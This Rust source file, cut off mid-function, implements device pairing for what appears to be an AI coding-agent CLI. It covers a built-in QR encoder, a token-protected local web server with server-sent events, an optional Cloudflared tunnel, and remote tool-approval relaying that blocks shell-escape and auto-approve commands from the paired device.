//! Device pairing: a token-protected local HTTP server (mobile web UI + SSE), an optional free
//! Cloudflared quick tunnel, and a terminal QR code for the pairing link.

use crate::files::limit_text;
use crate::jsutil::{now_iso, stringify};
use anyhow::{anyhow, Result};
use base64::Engine;
use regex::Regex;
use serde_json::{json, Value};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, Mutex, Weak};
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::sync::{mpsc, oneshot};
use tokio_util::sync::CancellationToken;

// ---------------------------------------------------------------------------------------------
// QR code encoder (ISO/IEC 18004, versions 1..10, level L, byte mode)
// ---------------------------------------------------------------------------------------------

struct QrVersion {
    version: usize,
    data_codewords: usize,
    ec_per_block: usize,
    blocks: &'static [(usize, usize)],
    alignment: &'static [usize],
}

const QR_VERSIONS_L: [QrVersion; 10] = [
    QrVersion { version: 1, data_codewords: 19, ec_per_block: 7, blocks: &[(1, 19)], alignment: &[] },
    QrVersion { version: 2, data_codewords: 34, ec_per_block: 10, blocks: &[(1, 34)], alignment: &[6, 18] },
    QrVersion { version: 3, data_codewords: 55, ec_per_block: 15, blocks: &[(1, 55)], alignment: &[6, 22] },
    QrVersion { version: 4, data_codewords: 80, ec_per_block: 20, blocks: &[(1, 80)], alignment: &[6, 26] },
    QrVersion { version: 5, data_codewords: 108, ec_per_block: 26, blocks: &[(1, 108)], alignment: &[6, 30] },
    QrVersion { version: 6, data_codewords: 136, ec_per_block: 18, blocks: &[(2, 68)], alignment: &[6, 34] },
    QrVersion { version: 7, data_codewords: 156, ec_per_block: 20, blocks: &[(2, 78)], alignment: &[6, 22, 38] },
    QrVersion { version: 8, data_codewords: 194, ec_per_block: 24, blocks: &[(2, 97)], alignment: &[6, 24, 42] },
    QrVersion { version: 9, data_codewords: 232, ec_per_block: 30, blocks: &[(2, 116)], alignment: &[6, 26, 46] },
    QrVersion { version: 10, data_codewords: 274, ec_per_block: 18, blocks: &[(2, 68), (2, 69)], alignment: &[6, 28, 50] },
];

struct Gf {
    exp: [u8; 512],
    log: [u8; 256],
}

fn gf() -> &'static Gf {
    static GF: std::sync::OnceLock<Gf> = std::sync::OnceLock::new();
    GF.get_or_init(|| {
        let mut g = Gf { exp: [0; 512], log: [0; 256] };
        let mut x: u32 = 1;
        for i in 0..255 {
            g.exp[i] = x as u8;
            g.log[x as usize] = i as u8;
            x <<= 1;
            if x & 0x100 != 0 {
                x ^= 0x11d;
            }
        }
        for i in 255..512 {
            g.exp[i] = g.exp[i - 255];
        }
        g
    })
}

fn gf_mul(a: u8, b: u8) -> u8 {
    if a == 0 || b == 0 {
        return 0;
    }
    let g = gf();
    g.exp[g.log[a as usize] as usize + g.log[b as usize] as usize]
}

fn rs_generator(degree: usize) -> Vec<u8> {
    let mut poly = vec![1u8];
    for i in 0..degree {
        let mut next = vec![0u8; poly.len() + 1];
        let root = gf().exp[i];
        for j in 0..poly.len() {
            next[j] ^= poly[j];
            next[j + 1] ^= gf_mul(poly[j], root);
        }
        poly = next;
    }
    poly
}

fn rs_remainder(data: &[u8], ec: usize) -> Vec<u8> {
    let generator = rs_generator(ec);
    let mut rem = vec![0u8; ec];
    for &d in data {
        let factor = d ^ rem[0];
        rem.copy_within(1.., 0);
        rem[ec - 1] = 0;
        if factor != 0 {
            for j in 0..ec {
                rem[j] ^= gf_mul(generator[j + 1], factor);
            }
        }
    }
    rem
}

fn format_bits(ec_level: u32, mask: u32) -> u32 {
    let data = ((ec_level & 0x03) << 3) | (mask & 0x07);
    let mut rem = data << 10;
    for i in (10..=14).rev() {
        if (rem >> i) & 1 == 1 {
            rem ^= 0x537 << (i - 10);
        }
    }
    ((data << 10) | rem) ^ 0x5412
}

fn version_bits(version: u32) -> u32 {
    let mut rem = version << 12;
    for i in (12..=17).rev() {
        if (rem >> i) & 1 == 1 {
            rem ^= 0x1f25 << (i - 12);
        }
    }
    (version << 12) | rem
}

pub fn encode_qr_matrix(text: &str) -> Result<Vec<Vec<bool>>> {
    let payload = text.as_bytes();
    let spec = QR_VERSIONS_L
        .iter()
        .find(|s| {
            let count_bits = if s.version <= 9 { 8 } else { 16 };
            payload.len() <= (s.data_codewords * 8 - 4 - count_bits) / 8
        })
        .ok_or_else(|| anyhow!("QR payload too long ({} bytes; max 271 bytes).", payload.len()))?;
    let mut bits: Vec<u8> = vec![];
    let push = |val: u32, len: usize, bits: &mut Vec<u8>| {
        for i in (0..len).rev() {
            bits.push(((val >> i) & 1) as u8);
        }
    };
    push(0b0100, 4, &mut bits);
    push(payload.len() as u32, if spec.version <= 9 { 8 } else { 16 }, &mut bits);
    for &b in payload {
        push(b as u32, 8, &mut bits);
    }
    let total = spec.data_codewords * 8;
    let term = 4.min(total - bits.len());
    push(0, term, &mut bits);
    while !bits.len().is_multiple_of(8) {
        bits.push(0);
    }
    let mut data = vec![0u8; spec.data_codewords];
    for i in 0..bits.len() / 8 {
        let mut b = 0u8;
        for j in 0..8 {
            b = (b << 1) | bits[i * 8 + j];
        }
        data[i] = b;
    }
    let pads = [0xecu8, 0x11];
    let mut p = 0;
    for slot in data.iter_mut().skip(bits.len() / 8) {
        *slot = pads[p];
        p ^= 1;
    }
    let mut data_blocks: Vec<Vec<u8>> = vec![];
    let mut ec_blocks: Vec<Vec<u8>> = vec![];
    let mut offset = 0;
    for &(count, len) in spec.blocks {
        for _ in 0..count {
            let block = data[offset..offset + len].to_vec();
            offset += len;
            ec_blocks.push(rs_remainder(&block, spec.ec_per_block));
            data_blocks.push(block);
        }
    }
    let mut codewords = vec![];
    let max_len = data_blocks.iter().map(Vec::len).max().unwrap_or(0);
    for i in 0..max_len {
        for b in &data_blocks {
            if i < b.len() {
                codewords.push(b[i]);
            }
        }
    }
    for i in 0..spec.ec_per_block {
        for b in &ec_blocks {
            if i < b.len() {
                codewords.push(b[i]);
            }
        }
    }
    let size = 17 + spec.version * 4;
    let mut modules = vec![vec![false; size]; size];
    let mut func = vec![vec![false; size]; size];
    let set = |r: i64, c: i64, dark: bool, modules: &mut Vec<Vec<bool>>, func: &mut Vec<Vec<bool>>| {
        if r < 0 || r >= size as i64 || c < 0 || c >= size as i64 {
            return;
        }
        modules[r as usize][c as usize] = dark;
        func[r as usize][c as usize] = true;
    };
    for (top, left) in [(0i64, 0i64), (0, size as i64 - 7), (size as i64 - 7, 0)] {
        for dr in -1..=7i64 {
            for dc in -1..=7i64 {
                let outer = (0..=6).contains(&dr) && (0..=6).contains(&dc);
                let border = dr == 0 || dr == 6 || dc == 0 || dc == 6;
                let inner = (2..=4).contains(&dr) && (2..=4).contains(&dc);
                set(top + dr, left + dc, outer && (border || inner), &mut modules, &mut func);
            }
        }
    }
    for i in 8..size - 8 {
        set(6, i as i64, i % 2 == 0, &mut modules, &mut func);
        set(i as i64, 6, i % 2 == 0, &mut modules, &mut func);
    }
    let align = spec.alignment;
    for i in 0..align.len() {
        for j in 0..align.len() {
            if (i == 0 && j == 0) || (i == 0 && j == align.len() - 1) || (i == align.len() - 1 && j == 0) {
                continue;
            }
            for dr in -2..=2i64 {
                for dc in -2..=2i64 {
                    set(align[i] as i64 + dr, align[j] as i64 + dc, dr.abs().max(dc.abs()) != 1, &mut modules, &mut func);
                }
            }
        }
    }
    set(size as i64 - 8, 8, true, &mut modules, &mut func);
    for i in 0..=8 {
        if !func[8][i] {
            set(8, i as i64, false, &mut modules, &mut func);
        }
        if !func[i][8] {
            set(i as i64, 8, false, &mut modules, &mut func);
        }
    }
    for i in 0..8 {
        if !func[8][size - 1 - i] {
            set(8, (size - 1 - i) as i64, false, &mut modules, &mut func);
        }
        if !func[size - 1 - i][8] {
            set((size - 1 - i) as i64, 8, false, &mut modules, &mut func);
        }
    }
    if spec.version >= 7 {
        let v = version_bits(spec.version as u32);
        for i in 0..18 {
            let bit = (v >> i) & 1 == 1;
            let a = (size - 11 + i % 3) as i64;
            let b = (i / 3) as i64;
            set(b, a, bit, &mut modules, &mut func);
            set(a, b, bit, &mut modules, &mut func);
        }
    }
    let mut all_bits = vec![];
    for cw in &codewords {
        for i in (0..8).rev() {
            all_bits.push((cw >> i) & 1);
        }
    }
    let mut idx = 0;
    let mut upward = true;
    let mut right = size as i64 - 1;
    while right >= 1 {
        if right == 6 {
            right = 5;
        }
        for vert in 0..size {
            let r = if upward { size - 1 - vert } else { vert };
            for j in 0..2 {
                let c = (right - j) as usize;
                if !func[r][c] {
                    modules[r][c] = idx < all_bits.len() && all_bits[idx] == 1;
                    if idx < all_bits.len() {
                        idx += 1;
                    }
                }
            }
        }
        upward = !upward;
        right -= 2;
    }
    let apply = |mask: u32| -> Vec<Vec<bool>> {
        let mut grid = modules.clone();
        for r in 0..size {
            for c in 0..size {
                if func[r][c] {
                    continue;
                }
                let invert = match mask {
                    0 => (r + c) % 2 == 0,
                    1 => r % 2 == 0,
                    2 => c % 3 == 0,
                    _ => (r + c) % 3 == 0,
                };
                if invert {
                    grid[r][c] = !grid[r][c];
                }
            }
        }
        let f = format_bits(0b01, mask);
        let bit = |i: u32| (f >> i) & 1 == 1;
        for (i, cell) in grid[8].iter_mut().enumerate().take(6) {
            *cell = bit(i as u32);
        }
        grid[8][7] = bit(6);
        grid[8][8] = bit(7);
        grid[7][8] = bit(8);
        for i in 9..15 {
            grid[14 - i][8] = bit(i as u32);
        }
        for i in 0..8 {
            grid[8][size - 1 - i] = bit(i as u32);
        }
        for i in 8..15 {
            grid[size - 15 + i][8] = bit(i as u32);
        }
        grid[size - 8][8] = true;
        grid
    };
    let penalty = |grid: &Vec<Vec<bool>>| -> u32 {
        let mut score = 0;
        for row in grid.iter() {
            let mut run = 1;
            for c in 1..size {
                if row[c] == row[c - 1] {
                    run += 1;
                    if run == 5 {
                        score += 3;
                    } else if run > 5 {
                        score += 1;
                    }
                } else {
                    run = 1;
                }
            }
        }
        #[allow(clippy::needless_range_loop)] // column scan: c indexes every row
        for c in 0..size {
            let mut run = 1;
            for r in 1..size {
                if grid[r][c] == grid[r - 1][c] {
                    run += 1;
                    if run == 5 {
                        score += 3;
                    } else if run > 5 {
                        score += 1;
                    }
                } else {
                    run = 1;
                }
            }
        }
        score
    };
    let mut best = apply(0);
    let mut best_score = penalty(&best);
    for m in 1..4 {
        let candidate = apply(m);
        let s = penalty(&candidate);
        if s < best_score {
            best_score = s;
            best = candidate;
        }
    }
    Ok(best)
}

/// Half-block QR rendering with a 2-module quiet zone (light modules drawn as blocks).
pub fn render_qr_terminal(url: &str, indent: &str) -> String {
    let Ok(matrix) = encode_qr_matrix(url) else { return format!("{indent}(QR unavailable: link too long)") };
    let n = matrix.len();
    let quiet = 2;
    let total = n + quiet * 2;
    let light = |r: usize, c: usize| -> bool {
        if r < quiet || c < quiet || r - quiet >= n || c - quiet >= n {
            return true;
        }
        !matrix[r - quiet][c - quiet]
    };
    let mut lines = vec![];
    let mut r = 0;
    while r < total {
        let mut row = indent.to_string();
        for c in 0..total {
            let top = light(r, c);
            let bottom = if r + 1 < total { light(r + 1, c) } else { false };
            row.push(match (top, bottom) {
                (true, true) => '█',
                (true, false) => '▀',
                (false, true) => '▄',
                _ => ' ',
            });
        }
        lines.push(row);
        r += 2;
    }
    lines.join("\n")
}

// ---------------------------------------------------------------------------------------------
// Pair manager
// ---------------------------------------------------------------------------------------------

pub fn is_forbidden_remote_input(raw: &str) -> bool {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return false;
    }
    if trimmed.starts_with('!') {
        return true;
    }
    let lower = trimmed.to_lowercase();
    if lower == "/yolo" || lower.starts_with("/yolo ") || lower == "/auto" {
        return true;
    }
    if let Some(arg) = lower.strip_prefix("/auto ") {
        if ["", "on", "true", "1", "yes", "toggle"].contains(&arg.trim()) {
            return true;
        }
    }
    if let Some(arg) = lower.strip_prefix("/mode") {
        if ["", "auto", "auto-approve", "yolo"].contains(&arg.trim()) {
            return true;
        }
    }
    false
}

/// The default-route IPv4 address (no packet is sent); loopback when offline.
fn detect_lan_ip() -> String {
    let socket = std::net::UdpSocket::bind("0.0.0.0:0");
    if let Ok(s) = socket {
        if s.connect("8.8.8.8:80").is_ok() {
            if let Ok(addr) = s.local_addr() {
                let ip = addr.ip().to_string();
                if !ip.starts_with("0.") && !ip.starts_with("169.254.") {
                    return ip;
                }
            }
        }
    }
    "127.0.0.1".into()
}

fn safe_token_equals(candidate: Option<&str>, expected: &str) -> bool {
    let Some(c) = candidate.filter(|c| !c.is_empty()) else { return false };
    if expected.is_empty() || c.len() != expected.len() {
        return false;
    }
    c.bytes().zip(expected.bytes()).fold(0u8, |acc, (a, b)| acc | (a ^ b)) == 0
}

fn random_bytes(n: usize) -> Vec<u8> {
    let mut out = vec![];
    while out.len() < n {
        out.extend_from_slice(uuid::Uuid::new_v4().as_bytes());
    }
    out.truncate(n);
    out
}

fn random_token(bytes: usize) -> String {
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(random_bytes(bytes))
}

#[derive(Clone)]
pub struct PairCallbacks {
    pub get_state: Arc<dyn Fn() -> Value + Send + Sync>,
    pub get_history: Arc<dyn Fn() -> Vec<(String, String)> + Send + Sync>,
    pub on_remote_prompt: Arc<dyn Fn(String) + Send + Sync>,
    pub on_remote_mode_change: Arc<dyn Fn(String) + Send + Sync>,
    pub on_remote_stop: Arc<dyn Fn() + Send + Sync>,
    pub on_notice: Arc<dyn Fn(String) + Send + Sync>,
}

#[derive(Clone, Debug)]
struct Entry {
    id: u64,
    seq: u64,
    kind: &'static str,
    text: String,
}

impl Entry {
    fn to_value(&self) -> Value {
        json!({ "id": self.id, "seq": self.seq, "kind": self.kind, "text": self.text })
    }
}

struct PendingApproval {
    tool: String,
    preview: String,
    created_at: String,
    tx: Option<oneshot::Sender<String>>,
}

#[derive(Default)]
struct PairState {
    running: bool,
    port: u16,
    bind_host: String,
    token: String,
    tunnel_url: Option<String>,
    tunnel_status: &'static str,
    tunnel_error: Option<String>,
    clients: Vec<(u64, mpsc::UnboundedSender<String>)>,
    pending: indexmap::IndexMap<String, PendingApproval>,
    recent_events: Vec<String>,
    entries: Vec<Entry>,
    next_entry_id: u64,
    seq: u64,
    active_assistant: Option<u64>,
    seeded_session: Option<String>,
    stop: Option<CancellationToken>,
    tunnel: Option<tokio::process::Child>,
}

pub struct PairManager {
    me: Weak<PairManager>,
    callbacks: PairCallbacks,
    state: Mutex<PairState>,
    client_ids: AtomicU64,
}

/// A pending remote approval: `wait()` resolves when the paired device answers.
pub struct RemoteApproval {
    pub id: String,
    rx: tokio::sync::Mutex<Option<oneshot::Receiver<String>>>,
    manager: Weak<PairManager>,
}

impl RemoteApproval {
    pub async fn wait(&self) -> Option<String> {
        let rx = self.rx.lock().await.take()?;
        rx.await.ok()
    }

    pub fn cancel(&self, resolved_by: &str) {
        if let Some(m) = self.manager.upgrade() {
            let removed = m.state.lock().unwrap().pending.shift_remove(&self.id).is_some();
            if removed {
                m.broadcast(&json!({ "type": "approval_resolved", "id": self.id, "decision": resolved_by }), false);
            }
        }
    }
}

impl PairManager {
    pub fn new(callbacks: PairCallbacks) -> Arc<PairManager> {
        Arc::new_cyclic(|me| PairManager {
            me: me.clone(),
            callbacks,
            state: Mutex::new(PairState { bind_host: "127.0.0.1".into(), token: random_token(16), tunnel_status: "stopped", next_entry_id: 1, ..Default::default() }),
            client_ids: AtomicU64::new(1),
        })
    }

    pub fn is_running(&self) -> bool {
        self.state.lock().unwrap().running
    }

    pub fn listening_host(&self) -> String {
        self.state.lock().unwrap().bind_host.clone()
    }

    fn info(&self) -> Value {
        let st = self.state.lock().unwrap();
        let lan = detect_lan_ip();
        let local_url = format!("http://127.0.0.1:{}/?t={}", st.port, st.token);
        let lan_url = format!("http://{lan}:{}/?t={}", st.port, st.token);
        let public = match &st.tunnel_url {
            Some(u) => format!("{u}/?t={}", st.token),
            None if st.bind_host == "0.0.0.0" => lan_url.clone(),
            None => local_url.clone(),
        };
        json!({ "running": st.running, "port": st.port, "token": st.token, "localUrl": local_url, "lanUrl": lan_url, "tunnelUrl": st.tunnel_url, "publicPairUrl": public, "tunnelStatus": st.tunnel_status, "tunnelError": st.tunnel_error, "connectedClients": st.clients.len() })
    }

    pub async fn start(&self, skip_tunnel: bool) -> Result<()> {
        if self.is_running() {
            return Ok(());
        }
        let bind = if skip_tunnel { "0.0.0.0" } else { "127.0.0.1" };
        let listener = tokio::net::TcpListener::bind((bind, 0)).await?;
        let port = listener.local_addr()?.port();
        let stop = CancellationToken::new();
        {
            let mut st = self.state.lock().unwrap();
            st.token = random_token(16);
            st.tunnel_url = None;
            st.tunnel_error = None;
            st.tunnel_status = "starting";
            st.bind_host = bind.into();
            st.port = port;
            st.running = true;
            st.stop = Some(stop.clone());
        }
        let me = self.me.clone();
        let accept_stop = stop.clone();
        tokio::spawn(async move {
            loop {
                tokio::select! {
                    _ = accept_stop.cancelled() => return,
                    conn = listener.accept() => {
                        let Ok((socket, _)) = conn else { continue };
                        let me = me.clone();
                        let stop = accept_stop.clone();
                        tokio::spawn(async move {
                            if let Some(m) = me.upgrade() {
                                let _ = m.handle_connection(socket, stop).await;
                            }
                        });
                    }
                }
            }
        });
        let me = self.me.clone();
        let hb_stop = stop.clone();
        tokio::spawn(async move {
            loop {
                tokio::select! {
                    _ = hb_stop.cancelled() => return,
                    _ = tokio::time::sleep(Duration::from_secs(15)) => {
                        let Some(m) = me.upgrade() else { return };
                        let mut st = m.state.lock().unwrap();
                        st.clients.retain(|(_, tx)| tx.send(": ping\n\n".into()).is_ok());
                    }
                }
            }
        });
        if skip_tunnel {
            self.state.lock().unwrap().tunnel_status = "fallback_lan";
            return Ok(());
        }
        self.launch_cloudflared(20_000).await;
        Ok(())
    }

    async fn wait_for_tunnel_dns(url: &str, max_wait_ms: u64) {
        let Ok(parsed) = url::Url::parse(url) else { return };
        let host = parsed.host_str().unwrap_or("").to_string();
        let client = reqwest::Client::new();
        let deadline = std::time::Instant::now() + Duration::from_millis(max_wait_ms);
        while std::time::Instant::now() < deadline {
            let request = client.get("https://cloudflare-dns.com/dns-query").query(&[("name", host.as_str()), ("type", "A")]).header("accept", "application/dns-json").timeout(Duration::from_secs(2));
            if let Ok(res) = request.send().await {
                if let Ok(body) = res.json::<Value>().await {
                    if body.get("Status").and_then(Value::as_i64) == Some(0) && body.get("Answer").and_then(Value::as_array).map(|a| !a.is_empty()).unwrap_or(false) {
                        tokio::time::sleep(Duration::from_millis(600)).await;
                        return;
                    }
                }
            }
            tokio::time::sleep(Duration::from_millis(600)).await;
        }
    }

    async fn launch_cloudflared(&self, timeout_ms: u64) {
        let port = self.state.lock().unwrap().port;
        let binary = resolve_cloudflared_binary().await;
        let mut cmd = tokio::process::Command::new(&binary);
        cmd.args(["tunnel", "--no-autoupdate", "--url", &format!("http://127.0.0.1:{port}")])
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true);
        #[cfg(windows)]
        {
            cmd.creation_flags(0x0800_0000);
        }
        let mut child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                let mut st = self.state.lock().unwrap();
                st.tunnel_status = "fallback_lan";
                st.tunnel_error = Some(format!(
                    "cloudflared not found or failed (spawn {binary} {}). Run \"/pair lan\" to pair over local Wi-Fi.",
                    if e.kind() == std::io::ErrorKind::NotFound { "ENOENT".to_string() } else { e.to_string() }
                ));
                return;
            }
        };
        let (line_tx, mut line_rx) = mpsc::unbounded_channel::<String>();
        for stream in
            [child.stdout.take().map(|s| Box::new(s) as Box<dyn tokio::io::AsyncRead + Unpin + Send>), child.stderr.take().map(|s| Box::new(s) as Box<dyn tokio::io::AsyncRead + Unpin + Send>)]
                .into_iter()
                .flatten()
        {
            let tx = line_tx.clone();
            tokio::spawn(async move {
                let mut lines = BufReader::new(stream).lines();
                while let Ok(Some(line)) = lines.next_line().await {
                    if tx.send(line).is_err() {
                        return;
                    }
                }
            });
        }
        drop(line_tx);
        self.state.lock().unwrap().tunnel = Some(child);
        let url_re = Regex::new(r"(?i)https://[a-z0-9-]+\.trycloudflare\.com").unwrap();
        let mut matched: Option<String> = None;
        let mut registered = false;
        let deadline = tokio::time::sleep(Duration::from_millis(timeout_ms));
        tokio::pin!(deadline);
        loop {
            tokio::select! {
                _ = &mut deadline => {
                    let mut st = self.state.lock().unwrap();
                    if let (Some(url), None) = (&matched, &st.tunnel_url) {
                        st.tunnel_url = Some(url.clone());
                        st.tunnel_status = "connected";
                        let notice = format!("Paired tunnel ready: {url}/?t={}", st.token);
                        drop(st);
                        (self.callbacks.on_notice)(notice);
                    } else if st.tunnel_url.is_none() {
                        st.tunnel_status = "fallback_lan";
                        if st.tunnel_error.is_none() {
                            st.tunnel_error = Some("Timed out waiting for trycloudflare.com URL; using local URL (run \"/pair lan\" for Wi-Fi).".into());
                        }
                    }
                    return;
                }
                line = line_rx.recv() => {
                    let Some(line) = line else {
                        let code = {
                            let mut st = self.state.lock().unwrap();
                            st.tunnel.as_mut().and_then(|c| c.try_wait().ok().flatten()).and_then(|s| s.code())
                        };
                        let mut st = self.state.lock().unwrap();
                        if st.tunnel_url.is_none() {
                            st.tunnel_status = "fallback_lan";
                            if st.tunnel_error.is_none() {
                                st.tunnel_error = Some(format!("cloudflared exited with code {}.", code.map(|c| c.to_string()).unwrap_or_else(|| "unknown".into())));
                            }
                        }
                        return;
                    };
                    if matched.is_none() {
                        matched = url_re.find(&line).map(|m| m.as_str().to_string());
                    }
                    if line.contains("Registered tunnel connection") {
                        registered = true;
                    }
                    if let (Some(url), true) = (&matched, registered) {
                        let remaining = timeout_ms.saturating_sub(4000).max(2000);
                        Self::wait_for_tunnel_dns(url, remaining.min(8000)).await;
                        let notice = {
                            let mut st = self.state.lock().unwrap();
                            st.tunnel_url = Some(url.clone());
                            st.tunnel_status = "connected";
                            format!("Paired tunnel ready: {url}/?t={}", st.token)
                        };
                        (self.callbacks.on_notice)(notice);
                        return;
                    }
                }
            }
        }
    }

    pub async fn stop(&self) {
        let (stop, tunnel, pending) = {
            let mut st = self.state.lock().unwrap();
            let pending: Vec<PendingApproval> = st.pending.drain(..).map(|(_, p)| p).collect();
            st.clients.clear();
            st.running = false;
            st.tunnel_status = "stopped";
            st.tunnel_url = None;
            (st.stop.take(), st.tunnel.take(), pending)
        };
        for mut p in pending {
            if let Some(tx) = p.tx.take() {
                let _ = tx.send("no".into());
            }
        }
        if let Some(mut t) = tunnel {
            let _ = t.start_kill();
            let _ = tokio::time::timeout(Duration::from_millis(500), t.wait()).await;
        }
        if let Some(s) = stop {
            s.cancel();
        }
    }

    fn ensure_history_seeded(&self) {
        let session = (self.callbacks.get_state)().get("sessionId").and_then(Value::as_str).unwrap_or("").to_string();
        let needs = self.state.lock().unwrap().seeded_session.as_deref() != Some(session.as_str());
        if !needs {
            return;
        }
        let history = (self.callbacks.get_history)();
        let mut st = self.state.lock().unwrap();
        st.seeded_session = Some(session);
        st.entries.clear();
        st.active_assistant = None;
        drop(st);
        for (role, text) in history {
            let clean = text.trim().to_string();
            if clean.is_empty() {
                continue;
            }
            let kind = if role == "user" { "user" } else { "assistant" };
            self.append_entry(kind, if role == "user" { format!("› {clean}") } else { clean }, false);
        }
    }

    fn append_entry(&self, kind: &'static str, text: String, broadcast: bool) -> u64 {
        let entry = {
            let mut st = self.state.lock().unwrap();
            if kind != "assistant" {
                st.active_assistant = None;
            }
            st.seq += 1;
            let entry = Entry { id: st.next_entry_id, seq: st.seq, kind, text: limit_text(&text, 8_000) };
            st.next_entry_id += 1;
            st.entries.push(entry.clone());
            if st.entries.len() > 150 {
                st.entries.remove(0);
            }
            entry
        };
        if broadcast {
            self.broadcast(&json!({ "type": "entry", "entry": entry.to_value() }), false);
        }
        entry.id
    }

    fn broadcast(&self, payload: &Value, replayable: bool) {
        let data = format!("data: {}\n\n", stringify(payload));
        let mut st = self.state.lock().unwrap();
        if replayable {
            st.recent_events.push(data.clone());
            if st.recent_events.len() > 60 {
                st.recent_events.remove(0);
            }
        }
        st.clients.retain(|(_, tx)| tx.send(data.clone()).is_ok());
    }

    pub fn notify_user_prompt(&self, prompt: &str) {
        self.ensure_history_seeded();
        let formatted = format!("› {prompt}");
        let duplicate = self.state.lock().unwrap().entries.last().map(|e| e.kind == "user" && e.text == formatted).unwrap_or(false);
        if !duplicate {
            self.append_entry("user", formatted, true);
        }
        self.state.lock().unwrap().active_assistant = None;
        self.sync_state();
    }

    pub fn notify_system(&self, text: &str) {
        let clean = text.trim();
        if clean.is_empty() {
            return;
        }
        if clean.contains("Pair Device via Cloudflared Tunnel")
            || clean.contains("╭─── goon")
            || clean.contains("╭─── Resumed Session")
            || clean.starts_with("↻ Resumed session")
            || clean.starts_with("Starting Cloudflared tunnel")
            || clean.starts_with("[answer]\n")
            || clean.starts_with("[reasoning]\n")
            || clean.starts_with("> ")
        {
            return;
        }
        self.ensure_history_seeded();
        self.state.lock().unwrap().active_assistant = None;
        self.append_entry("system", clean.to_string(), true);
    }

    pub fn notify_event(&self, event: &Value) {
        self.ensure_history_seeded();
        let s = |k: &str| event.get(k).and_then(Value::as_str).unwrap_or("").to_string();
        let first = |k: &str| crate::jsutil::slice_chars(Regex::new(r"\r?\n").unwrap().split(&s(k)).next().unwrap_or(""), 0, 200).to_string();
        let kind = s("type");
        let tool = |me: &Self, text: String| {
            me.state.lock().unwrap().active_assistant = None;
            me.append_entry("tool", text, true);
        };
        match kind.as_str() {
            "text" => {
                let text = s("text");
                let updated = {
                    let mut st = self.state.lock().unwrap();
                    match st.active_assistant {
                        Some(id) => {
                            st.seq += 1;
                            let seq = st.seq;
                            st.entries.iter_mut().find(|e| e.id == id).map(|e| {
                                e.text = limit_text(&format!("{}{text}", e.text), 8_000);
                                e.seq = seq;
                                e.clone()
                            })
                        }
                        None => None,
                    }
                };
                match updated {
                    Some(entry) => self.broadcast(&json!({ "type": "entry", "entry": entry.to_value() }), false),
                    None => {
                        let id = self.append_entry("assistant", text, true);
                        self.state.lock().unwrap().active_assistant = Some(id);
                    }
                }
            }
            "tool" if s("state") == "start" => {
                let summary = event.get("meta").and_then(|m| m.get("summary")).and_then(Value::as_str).filter(|x| !x.is_empty()).map(str::to_string).unwrap_or_else(|| s("state"));
                tool(self, format!("● [{}] {summary}", s("name")));
            }
            "subagent" if s("state") != "progress" => tool(self, format!("● [subagent:{}] {}", crate::jsutil::take_chars(&s("id"), 8), s("state"))),
            "verify_start" => tool(self, format!("● [verify] {} file(s)", event.get("files").and_then(Value::as_array).map(|a| a.len()).unwrap_or(0))),
            "verify_result" => {
                tool(self, format!("● [verify] {}: {}", s("status"), first("reason")));
                self.sync_state();
            }
            "verify_rollback" => {
                tool(self, format!("● [verify rollback] {}", first("reason")));
                self.sync_state();
            }
            "dag_plan_invalid" => {
                tool(self, format!("● [dag] plan invalid: {}", crate::jsutil::slice_chars(&s("message"), 0, 200)));
                self.sync_state();
            }
            "dag_plan_ready" => {
                tool(self, format!("● [dag] plan ready: {} todo(s)", event.get("todos").map(crate::jsutil::js_string).unwrap_or_default()));
                self.sync_state();
            }
            "dag_todo_update" => {
                self.append_entry("tool", format!("● [dag] {}: {} ({})", s("todoId"), s("status"), s("role")), true);
                self.sync_state();
            }
            "dag_merge" => {
                let verified = event.get("verified").and_then(Value::as_bool).unwrap_or(false);
                let reason = s("reason");
                tool(
                    self,
                    format!(
                        "● [dag] merge {}{}",
                        if verified { "verified" } else { "NOT verified" },
                        if reason.is_empty() { String::new() } else { format!(": {}", crate::jsutil::slice_chars(&reason, 0, 160)) }
                    ),
                );
                self.sync_state();
            }
            "usage" | "stopped" | "plan_exit" => {
                if kind == "stopped" {
                    self.state.lock().unwrap().active_assistant = None;
                }
                self.sync_state();
            }
            _ => {}
        }
    }

    pub fn sync_state(&self) {
        if !self.is_running() {
            return;
        }
        self.broadcast(&json!({ "type": "state", "state": (self.callbacks.get_state)() }), false);
    }

    /// Registers a pending approval the paired device can answer.
    pub fn request_remote_approval(&self, tool: &str, preview: &str, cancel: CancellationToken) -> RemoteApproval {
        let id = hex::encode(random_bytes(6));
        let (tx, rx) = oneshot::channel();
        let preview = crate::jsutil::take_chars(preview, 2000).to_string();
        self.state.lock().unwrap().pending.insert(id.clone(), PendingApproval { tool: tool.into(), preview: preview.clone(), created_at: now_iso(), tx: Some(tx) });
        self.broadcast(&json!({ "type": "approval", "id": id, "tool": tool, "preview": preview }), false);
        let me = self.me.clone();
        let watch_id = id.clone();
        tokio::spawn(async move {
            cancel.cancelled().await;
            if let Some(m) = me.upgrade() {
                let removed = m.state.lock().unwrap().pending.shift_remove(&watch_id).is_some();
                if removed {
                    m.broadcast(&json!({ "type": "approval_resolved", "id": watch_id, "decision": "cancelled" }), false);
                }
            }
        });
        RemoteApproval { id, rx: tokio::sync::Mutex::new(Some(rx)), manager: self.me.clone() }
    }

    pub fn format_banner(&self) -> String {
        let info = self.info();
        let s = |k: &str| info.get(k).and_then(Value::as_str).unwrap_or("").to_string();
        let bind = self.listening_host();
        let qr = render_qr_terminal(&s("publicPairUrl"), "  ");
        let status = if s("tunnelStatus") == "connected" {
            "Cloudflared Tunnel Active (Free)"
        } else if bind == "0.0.0.0" {
            "LAN Mode (0.0.0.0)"
        } else {
            "Localhost Only (127.0.0.1)"
        };
        let mut lines = vec!["╭─── Pair Device via Cloudflared Tunnel ──────────────────────────╮".to_string(), format!("  Status      : {status}")];
        if info.get("tunnelUrl").map(|v| !v.is_null()).unwrap_or(false) {
            lines.push(format!("  Tunnel URL  : {}", s("publicPairUrl")));
        }
        if bind == "0.0.0.0" {
            lines.push(format!("  LAN URL     : {}", s("lanUrl")));
        }
        lines.push(format!("  Local URL   : {}", s("localUrl")));
